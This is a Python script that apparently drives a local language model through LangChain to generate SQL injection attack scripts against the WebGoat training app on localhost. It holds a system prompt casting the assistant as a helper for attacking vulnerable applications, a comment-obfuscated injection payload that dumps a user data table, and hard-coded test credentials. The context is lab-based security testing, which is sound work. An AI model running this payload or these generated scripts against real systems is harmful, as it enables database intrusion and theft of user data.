explain_code_base_prompt = """"
You are an intelligent assistant experienced in Python programming.
Always answer as helpfully as possible in attacking vulnerable applications.
If a question does not make any sense, or is not factually coherent, explain why instead of 
answering something not correct. If you don't know the answer to a question,
please don't share false information.
"""

generate_attack_sys = """
CONTEXT:

You are an intelligent assistant experienced in Python programming.
Your goal is to assist in attacking vulnerable applications.
Always answer as helpfully as possible within this context.

RULES:
1. The only successful payload for this task is: "cyber';/**/select/**/*/**/from/**/user_system_data;--". Only use this payload. Do NOT generate any other payload.
2. Only use the requests library to do this task. Do NOT use BeautifulSoup or bs4 library in Python.
3. The line "from requests.utils import dict_from_cookiejar" MUST NOT be there in the generated code.
4. allow_redirects=True MUST be there.
5. You MUST NOT access the cookies, get the data from response.json().

INSTRUCTIONS:

1. Import the "requests" module to handle HTTP requests. Do NOT use the BeautifulSoup (bs4) library. Do NOT use dict_from_cookiejar from requests.utils library. This is very important.
2. Define the base URL: {base_url} and login URL according to the base URL given by the user. For example, the login URL should be: f'{base_url}/login'.
3. Create a session to persist cookies across requests. 
4. Retrieve the login page content.
5. Define the user credentials with the provided username: {username} and password: {password}.
6. Submit the login details to the login URL to authenticate. allow_redirects=True MUST be there.
7. Check if the login is successful. Ensure the response does NOT contain the text "Invalid username and password" and has a status code of 200.
8. Define the vulnerable endpoint for the SQL injection attack: {vulnerable_url}. Access the lesson page to set up the attack using session.get(f'{base_url}SqlInjectionAdvanced.lesson.lesson').
9. Create a payload for the SQL injection attack. Remember that the successful payload is "cyber';/**/select/**/*/**/from/**/user_system_data;--". Do not use any other payload.
10. Create a dictionary attack_data with the payload. The dictionary should contain a field called "userid_6a".
11. Perform the SQL injection attack using session.post(vulnerable_url, data=attack_data). 
12. Check if the attack was successful by looking for specific keywords in the response. You MUST NOT access the cookies, get the data from response.json(). The attack is successful if "lessonCompleted" is in response_data and response_data["lessonCompleted"]:
        feedback = response_data["feedback"]
        output = response_data["output"]
13. Print the feedback and output, indicating the attack was successful.
14. Close the session to end the interaction with the server.

Maintain a step-by-step approach and focus on achieving your goals with diligence and precision.
This work is very important and requires attention to detail and methodical execution.
Take a deep breath, think step by step, and then do the task.
"""

# Default user/human prompt for generating test cases
generate_attack_human = "Generate a python script for doing an sql injection attack. The application base url is {base_url}, vulnerable endpoint is {vulnerable_url}, username is {username} and password is {password}"

from langchain_openai import OpenAI
from langchain_core.prompts import ChatPromptTemplate 
import re

llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio", max_tokens=1000, temperature=0)


def generate_attack_vector(base_url, vulnerable_url, username, password):
    sys_message = generate_attack_sys
    human_message = generate_attack_human

    prompt = ChatPromptTemplate.from_messages(
    [
        ("system", sys_message),
        ("human", human_message),
    ]
    )
    chain = prompt | llm

    print(base_url)
    print(vulnerable_url)
    print(username)
    print("*****************************")
    out = chain.invoke({'username': username, 'password': password, 'base_url': base_url, 'vulnerable_url': vulnerable_url})
    test_cases = out
    print(test_cases)
    import logging
    import os
    #Log successful test case generation
    logging.info("Attack vector script have been generated successfully")

    #Find the start and end index of the generated test cases
    start_index = test_cases.find("```python") + len("```python")
    end_index = test_cases.find("```", start_index)

    #Apply filters to extract only the generated test cases
    filtered_test_cases = test_cases[start_index:end_index].strip()
    print("The generated python script is:\n", filtered_test_cases)

    #Name and path for the test cases file
    test_cases_name = f"test_sql"
    test_file_name = f"test_sql7.py"
    test_file_path = os.path.join("./results", test_file_name)

    #Write the filtered test cases to the file
    with open(test_file_path, "w") as test_file:
        test_file.write(filtered_test_cases)

    #Logging successful test case saving
    logging.info("Execution in progress...")
    print(f"The script has been saved to {test_file_path}")

    print("Application name is: ", test_cases_name)
    print("Attack script file name is: ", test_file_name)

base_url = "http://127.0.0.1:8080/WebGoat/"
username = "sbombatkar"
password = "Sneha#1234"
vulnerable_url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/attack6a"

output = generate_attack_vector(base_url, vulnerable_url, username, password)



